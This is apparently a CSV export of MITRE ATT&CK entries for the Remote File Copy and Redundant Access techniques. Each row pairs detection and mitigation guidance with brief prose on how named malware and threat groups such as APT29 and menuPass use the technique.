1145,"['Monitor for file creation and files transferred within a network over SMB. Unusual processes with external network connections creating files on-system may be suspicious. Use of utilities, such as FTP, that does not normally occur may also be suspicious.\n\nAnalyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],[],"['File monitoring', 'Packet capture', 'Process use of network', 'Netflow/Enclave netflow', 'Network protocol analysis', 'Process monitoring']",['[[Software/S0083|Misdat]] is capable of downloading files from the C2.[[CiteRef::Cylance Dust Storm]]'],['Dust Storm'],['Dust Storm'],['G0031'],"['Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware or unusual data transfer over known tools and protocols like FTP can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific obfuscation technique used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool C2 signatures over time or construct protocols in such a way as to avoid detection by common defensive tools.[[CiteRef::University of Birmingham C2]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",['User'],[],Software: Misdat,"['Command and Control', 'Lateral Movement']",['Technique/T1105'],['Remote File Copy'],https://attack.mitre.org/wiki/Technique/T1105
1146,"['Monitor for file creation and files transferred within a network over SMB. Unusual processes with external network connections creating files on-system may be suspicious. Use of utilities, such as FTP, that does not normally occur may also be suspicious.\n\nAnalyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],[],"['File monitoring', 'Packet capture', 'Process use of network', 'Netflow/Enclave netflow', 'Network protocol analysis', 'Process monitoring']",['[[Software/S0086|ZLib]] has the ability to download files.[[CiteRef::Cylance Dust Storm]]'],['Dust Storm'],['Dust Storm'],['G0031'],"['Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware or unusual data transfer over known tools and protocols like FTP can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific obfuscation technique used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool C2 signatures over time or construct protocols in such a way as to avoid detection by common defensive tools.[[CiteRef::University of Birmingham C2]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",['User'],[],Software: ZLib,"['Command and Control', 'Lateral Movement']",['Technique/T1105'],['Remote File Copy'],https://attack.mitre.org/wiki/Technique/T1105
1147,"['Monitor for file creation and files transferred within a network over SMB. Unusual processes with external network connections creating files on-system may be suspicious. Use of utilities, such as FTP, that does not normally occur may also be suspicious.\n\nAnalyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],[],"['File monitoring', 'Packet capture', 'Process use of network', 'Netflow/Enclave netflow', 'Network protocol analysis', 'Process monitoring']",['[[Software/S0054|CloudDuke]] downloads and executes additional malware from either a Web address or a Microsoft OneDrive account.[[CiteRef::F-Secure The Dukes]]'],['APT29'],"['APT29', 'The Dukes', 'Cozy Bear']",['G0016'],"['Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware or unusual data transfer over known tools and protocols like FTP can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific obfuscation technique used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool C2 signatures over time or construct protocols in such a way as to avoid detection by common defensive tools.[[CiteRef::University of Birmingham C2]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",['User'],[],"Software: CloudDuke, MiniDionis, CloudLook","['Command and Control', 'Lateral Movement']",['Technique/T1105'],['Remote File Copy'],https://attack.mitre.org/wiki/Technique/T1105
1148,"['Monitor for file creation and files transferred within a network over SMB. Unusual processes with external network connections creating files on-system may be suspicious. Use of utilities, such as FTP, that does not normally occur may also be suspicious.\n\nAnalyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],[],"['File monitoring', 'Packet capture', 'Process use of network', 'Netflow/Enclave netflow', 'Network protocol analysis', 'Process monitoring']",['[[Software/S0051|MiniDuke]] can download additional encrypted backdoors onto the victim via GIF files.[[CiteRef::Securelist MiniDuke Feb 2013]]'],['APT29'],"['APT29', 'The Dukes', 'Cozy Bear']",['G0016'],"['Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware or unusual data transfer over known tools and protocols like FTP can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific obfuscation technique used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool C2 signatures over time or construct protocols in such a way as to avoid detection by common defensive tools.[[CiteRef::University of Birmingham C2]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",['User'],[],Software: MiniDuke,"['Command and Control', 'Lateral Movement']",['Technique/T1105'],['Remote File Copy'],https://attack.mitre.org/wiki/Technique/T1105
1149,"['Monitor for file creation and files transferred within a network over SMB. Unusual processes with external network connections creating files on-system may be suspicious. Use of utilities, such as FTP, that does not normally occur may also be suspicious.\n\nAnalyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],[],"['File monitoring', 'Packet capture', 'Process use of network', 'Netflow/Enclave netflow', 'Network protocol analysis', 'Process monitoring']",['[[Software/S0053|SeaDuke]] is capable of uploading and downloading files.[[CiteRef::Unit 42 SeaDuke 2015]]'],['APT29'],"['APT29', 'The Dukes', 'Cozy Bear']",['G0016'],"['Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware or unusual data transfer over known tools and protocols like FTP can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific obfuscation technique used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool C2 signatures over time or construct protocols in such a way as to avoid detection by common defensive tools.[[CiteRef::University of Birmingham C2]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",['User'],[],"Software: SeaDuke, SeaDaddy, SeaDesk","['Command and Control', 'Lateral Movement']",['Technique/T1105'],['Remote File Copy'],https://attack.mitre.org/wiki/Technique/T1105
1150,"['Monitor for file creation and files transferred within a network over SMB. Unusual processes with external network connections creating files on-system may be suspicious. Use of utilities, such as FTP, that does not normally occur may also be suspicious.\n\nAnalyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],[],"['File monitoring', 'Packet capture', 'Process use of network', 'Netflow/Enclave netflow', 'Network protocol analysis', 'Process monitoring']",['[[Software/S0139|PowerDuke]] has a command to download a file.[[CiteRef::Volexity PowerDuke November 2016]]'],['APT29'],"['APT29', 'The Dukes', 'Cozy Bear']",['G0016'],"['Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware or unusual data transfer over known tools and protocols like FTP can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific obfuscation technique used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool C2 signatures over time or construct protocols in such a way as to avoid detection by common defensive tools.[[CiteRef::University of Birmingham C2]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",['User'],[],Software: PowerDuke,"['Command and Control', 'Lateral Movement']",['Technique/T1105'],['Remote File Copy'],https://attack.mitre.org/wiki/Technique/T1105
1151,"['Monitor for file creation and files transferred within a network over SMB. Unusual processes with external network connections creating files on-system may be suspicious. Use of utilities, such as FTP, that does not normally occur may also be suspicious.\n\nAnalyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],[],"['File monitoring', 'Packet capture', 'Process use of network', 'Netflow/Enclave netflow', 'Network protocol analysis', 'Process monitoring']",['[[Software/S0150|POSHSPY]] downloads and executes additional PowerShell code and Windows binaries.[[CiteRef::FireEye POSHSPY April 2017]]'],['APT29'],"['APT29', 'The Dukes', 'Cozy Bear']",['G0016'],"['Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware or unusual data transfer over known tools and protocols like FTP can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific obfuscation technique used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool C2 signatures over time or construct protocols in such a way as to avoid detection by common defensive tools.[[CiteRef::University of Birmingham C2]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",['User'],[],Software: POSHSPY,"['Command and Control', 'Lateral Movement']",['Technique/T1105'],['Remote File Copy'],https://attack.mitre.org/wiki/Technique/T1105
1152,"['Monitor for file creation and files transferred within a network over SMB. Unusual processes with external network connections creating files on-system may be suspicious. Use of utilities, such as FTP, that does not normally occur may also be suspicious.\n\nAnalyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],[],"['File monitoring', 'Packet capture', 'Process use of network', 'Netflow/Enclave netflow', 'Network protocol analysis', 'Process monitoring']",['Several [[Group/G0032|Lazarus Group]] malware families are capable of downloading and executing binaries from its C2 server.[[CiteRef::Novetta Blockbuster Destructive Malware]][[CiteRef::Novetta Blockbuster Loaders]]'],['Lazarus Group'],"['Lazarus Group', 'HIDDEN COBRA', 'Guardians of Peace']",['G0032'],"['Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware or unusual data transfer over known tools and protocols like FTP can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific obfuscation technique used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool C2 signatures over time or construct protocols in such a way as to avoid detection by common defensive tools.[[CiteRef::University of Birmingham C2]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",['User'],[],[],"['Command and Control', 'Lateral Movement']",['Technique/T1105'],['Remote File Copy'],https://attack.mitre.org/wiki/Technique/T1105
1153,"['Monitor for file creation and files transferred within a network over SMB. Unusual processes with external network connections creating files on-system may be suspicious. Use of utilities, such as FTP, that does not normally occur may also be suspicious.\n\nAnalyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],[],"['File monitoring', 'Packet capture', 'Process use of network', 'Netflow/Enclave netflow', 'Network protocol analysis', 'Process monitoring']","['[[Software/S0144|ChChes]] is capable of downloading files, including additional modules.[[CiteRef::Palo Alto menuPass Feb 2017]][[CiteRef::JPCERT ChChes Feb 2017]][[CiteRef::FireEye APT10 April 2017]]']",['menuPass'],"['menuPass', 'Stone Panda', 'APT10', 'Red Apollo', 'CVNX']",['G0045'],"['Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware or unusual data transfer over known tools and protocols like FTP can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific obfuscation technique used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool C2 signatures over time or construct protocols in such a way as to avoid detection by common defensive tools.[[CiteRef::University of Birmingham C2]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",['User'],[],"Software: ChChes, Scorpion, HAYMAKER","['Command and Control', 'Lateral Movement']",['Technique/T1105'],['Remote File Copy'],https://attack.mitre.org/wiki/Technique/T1105
1154,"['Monitor for file creation and files transferred within a network over SMB. Unusual processes with external network connections creating files on-system may be suspicious. Use of utilities, such as FTP, that does not normally occur may also be suspicious.\n\nAnalyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],[],"['File monitoring', 'Packet capture', 'Process use of network', 'Netflow/Enclave netflow', 'Network protocol analysis', 'Process monitoring']",['[[Software/S0153|RedLeaves]] is capable of downloading a file from a specified URL.[[CiteRef::PWC Cloud Hopper Technical Annex April 2017]]'],['menuPass'],"['menuPass', 'Stone Panda', 'APT10', 'Red Apollo', 'CVNX']",['G0045'],"['Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware or unusual data transfer over known tools and protocols like FTP can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific obfuscation technique used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool C2 signatures over time or construct protocols in such a way as to avoid detection by common defensive tools.[[CiteRef::University of Birmingham C2]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",['User'],[],"Software: RedLeaves, BUGJUICE","['Command and Control', 'Lateral Movement']",['Technique/T1105'],['Remote File Copy'],https://attack.mitre.org/wiki/Technique/T1105
1155,"['Monitor for file creation and files transferred within a network over SMB. Unusual processes with external network connections creating files on-system may be suspicious. Use of utilities, such as FTP, that does not normally occur may also be suspicious.\n\nAnalyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],[],"['File monitoring', 'Packet capture', 'Process use of network', 'Netflow/Enclave netflow', 'Network protocol analysis', 'Process monitoring']",['[[Software/S0106|cmd]] can be used to copy files to a remotely connected system.[[CiteRef::TechNet Copy]]'],['menuPass'],"['menuPass', 'Stone Panda', 'APT10', 'Red Apollo', 'CVNX']",['G0045'],"['Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware or unusual data transfer over known tools and protocols like FTP can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific obfuscation technique used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool C2 signatures over time or construct protocols in such a way as to avoid detection by common defensive tools.[[CiteRef::University of Birmingham C2]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",['User'],[],"Software: cmd, cmd.exe","['Command and Control', 'Lateral Movement']",['Technique/T1105'],['Remote File Copy'],https://attack.mitre.org/wiki/Technique/T1105
1156,"['Monitor for file creation and files transferred within a network over SMB. Unusual processes with external network connections creating files on-system may be suspicious. Use of utilities, such as FTP, that does not normally occur may also be suspicious.\n\nAnalyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],[],"['File monitoring', 'Packet capture', 'Process use of network', 'Netflow/Enclave netflow', 'Network protocol analysis', 'Process monitoring']",['[[Group/G0045|menuPass]] has installed updates and new malware on victims.[[CiteRef::PWC Cloud Hopper April 2017]]'],['menuPass'],"['menuPass', 'Stone Panda', 'APT10', 'Red Apollo', 'CVNX']",['G0045'],"['Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware or unusual data transfer over known tools and protocols like FTP can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific obfuscation technique used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool C2 signatures over time or construct protocols in such a way as to avoid detection by common defensive tools.[[CiteRef::University of Birmingham C2]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",['User'],[],[],"['Command and Control', 'Lateral Movement']",['Technique/T1105'],['Remote File Copy'],https://attack.mitre.org/wiki/Technique/T1105
1157,"['Monitor for file creation and files transferred within a network over SMB. Unusual processes with external network connections creating files on-system may be suspicious. Use of utilities, such as FTP, that does not normally occur may also be suspicious.\n\nAnalyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],[],"['File monitoring', 'Packet capture', 'Process use of network', 'Netflow/Enclave netflow', 'Network protocol analysis', 'Process monitoring']",['[[Software/S0062|DustySky]] searches for network drives and removable media and duplicates itself onto them.[[CiteRef::DustySky]]'],['Molerats'],"['Molerats', 'Gaza cybergang', 'Operation Molerats']",['G0021'],"['Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware or unusual data transfer over known tools and protocols like FTP can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific obfuscation technique used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool C2 signatures over time or construct protocols in such a way as to avoid detection by common defensive tools.[[CiteRef::University of Birmingham C2]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",['User'],[],"Software: DustySky, NeD Worm","['Command and Control', 'Lateral Movement']",['Technique/T1105'],['Remote File Copy'],https://attack.mitre.org/wiki/Technique/T1105
1158,"['Monitor for file creation and files transferred within a network over SMB. Unusual processes with external network connections creating files on-system may be suspicious. Use of utilities, such as FTP, that does not normally occur may also be suspicious.\n\nAnalyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],[],"['File monitoring', 'Packet capture', 'Process use of network', 'Netflow/Enclave netflow', 'Network protocol analysis', 'Process monitoring']",['A [[Group/G0040|Patchwork]] payload downloads additional malware from the C2 server.[[CiteRef::Securelist Dropping Elephant]]'],['Patchwork'],"['Patchwork', 'Dropping Elephant', 'Chinastrats']",['G0040'],"['Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware or unusual data transfer over known tools and protocols like FTP can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific obfuscation technique used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool C2 signatures over time or construct protocols in such a way as to avoid detection by common defensive tools.[[CiteRef::University of Birmingham C2]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",['User'],[],[],"['Command and Control', 'Lateral Movement']",['Technique/T1105'],['Remote File Copy'],https://attack.mitre.org/wiki/Technique/T1105
1159,"['Monitor for file creation and files transferred within a network over SMB. Unusual processes with external network connections creating files on-system may be suspicious. Use of utilities, such as FTP, that does not normally occur may also be suspicious.\n\nAnalyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],[],"['File monitoring', 'Packet capture', 'Process use of network', 'Netflow/Enclave netflow', 'Network protocol analysis', 'Process monitoring']",['[[Software/S0070|HTTPBrowser]] is capable of writing a file to the compromised system from the C2 server.[[CiteRef::Dell TG-3390]]'],['Threat Group-3390'],"['Threat Group-3390', 'TG-3390', 'Emissary Panda', 'BRONZE UNION']",['G0027'],"['Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware or unusual data transfer over known tools and protocols like FTP can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific obfuscation technique used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool C2 signatures over time or construct protocols in such a way as to avoid detection by common defensive tools.[[CiteRef::University of Birmingham C2]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",['User'],[],"Software: HTTPBrowser, Token Control, HttpDump","['Command and Control', 'Lateral Movement']",['Technique/T1105'],['Remote File Copy'],https://attack.mitre.org/wiki/Technique/T1105
1160,"['Monitor for file creation and files transferred within a network over SMB. Unusual processes with external network connections creating files on-system may be suspicious. Use of utilities, such as FTP, that does not normally occur may also be suspicious.\n\nAnalyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],[],"['File monitoring', 'Packet capture', 'Process use of network', 'Netflow/Enclave netflow', 'Network protocol analysis', 'Process monitoring']","['After re-establishing access to a victim network, [[Group/G0027|Threat Group-3390]] actors download tools including [[Software/S0008|gsecdump]] and WCE that are staged temporarily on websites that were previously compromised but never used.[[CiteRef::Dell TG-3390]]']",['Threat Group-3390'],"['Threat Group-3390', 'TG-3390', 'Emissary Panda', 'BRONZE UNION']",['G0027'],"['Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware or unusual data transfer over known tools and protocols like FTP can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific obfuscation technique used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool C2 signatures over time or construct protocols in such a way as to avoid detection by common defensive tools.[[CiteRef::University of Birmingham C2]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",['User'],[],[],"['Command and Control', 'Lateral Movement']",['Technique/T1105'],['Remote File Copy'],https://attack.mitre.org/wiki/Technique/T1105
1161,"['Existing methods of detecting remote access tools are helpful. Backup remote access tools or other access points may not have established command and control channels open during an intrusion, so the volume of data transferred may not be as high as the primary channel unless access is lost.\n\nDetection of tools based on beacon traffic, [[Command and Control]] protocol, or adversary infrastructure require prior threat intelligence on tools, IP addresses, and/or domains the adversary may use, along with the ability to detect use at the network boundary. Prior knowledge of indicators of compromise may also help detect adversary tools at the endpoint if tools are available to scan for those indicators.\n\nIf an intrusion is in progress and sufficient endpoint data or decoded command and control traffic is collected, then defenders will likely be able to detect additional tools dropped as the adversary is conducting the operation.\n\nFor alternative access using externally accessible VPNs or remote services, follow detection recommendations under [[Technique/T1078|Valid Accounts]] and [[Technique/T1133|External Remote Services]] to collect account use information.']","['Anti-virus', 'Network intrusion detection system']",[],[],"['Process monitoring', 'Process use of network', 'Packet capture', 'Network protocol analysis', 'File monitoring', 'Binary file metadata', 'Authentication logs']","[""[[Software/S0066|3PARA RAT]] will sleep until after a date/time value loaded from a .dat file has passed. This allows the RAT to remain dormant until a set date, which could allow a means to regain access if other parts of the actors' toolset are removed from a victim.[[CiteRef::CrowdStrike Putter Panda]]""]",['Putter Panda'],"['Putter Panda', 'APT2', 'MSUpdater']",['G0024'],"['Identify and block potentially malicious software that may be used as a remote access tool, and audit and/or block it by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]\n\nNetwork intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and will be different across various malware families and versions. Adversaries will likely change tool signatures over time or construct protocols in such a way as to avoid detection by common defensive tools.[[CiteRef::University of Birmingham C2]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']","['User', 'Administrator', 'SYSTEM']",[],Software: 3PARA RAT,"['Defense Evasion', 'Persistence']",['Technique/T1108'],['Redundant Access'],https://attack.mitre.org/wiki/Technique/T1108
1162,"['Existing methods of detecting remote access tools are helpful. Backup remote access tools or other access points may not have established command and control channels open during an intrusion, so the volume of data transferred may not be as high as the primary channel unless access is lost.\n\nDetection of tools based on beacon traffic, [[Command and Control]] protocol, or adversary infrastructure require prior threat intelligence on tools, IP addresses, and/or domains the adversary may use, along with the ability to detect use at the network boundary. Prior knowledge of indicators of compromise may also help detect adversary tools at the endpoint if tools are available to scan for those indicators.\n\nIf an intrusion is in progress and sufficient endpoint data or decoded command and control traffic is collected, then defenders will likely be able to detect additional tools dropped as the adversary is conducting the operation.\n\nFor alternative access using externally accessible VPNs or remote services, follow detection recommendations under [[Technique/T1078|Valid Accounts]] and [[Technique/T1133|External Remote Services]] to collect account use information.']","['Anti-virus', 'Network intrusion detection system']",[],[],"['Process monitoring', 'Process use of network', 'Packet capture', 'Network protocol analysis', 'File monitoring', 'Binary file metadata', 'Authentication logs']",['[[Group/G0027|Threat Group-3390]] has deployed backup web shells and obtained OWA account credentials during intrusions that it subsequently used to attempt to regain access when evicted from a victim network.[[CiteRef::SecureWorks BRONZE UNION June 2017]]'],['Threat Group-3390'],"['Threat Group-3390', 'TG-3390', 'Emissary Panda', 'BRONZE UNION']",['G0027'],"['Identify and block potentially malicious software that may be used as a remote access tool, and audit and/or block it by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]\n\nNetwork intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and will be different across various malware families and versions. Adversaries will likely change tool signatures over time or construct protocols in such a way as to avoid detection by common defensive tools.[[CiteRef::University of Birmingham C2]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 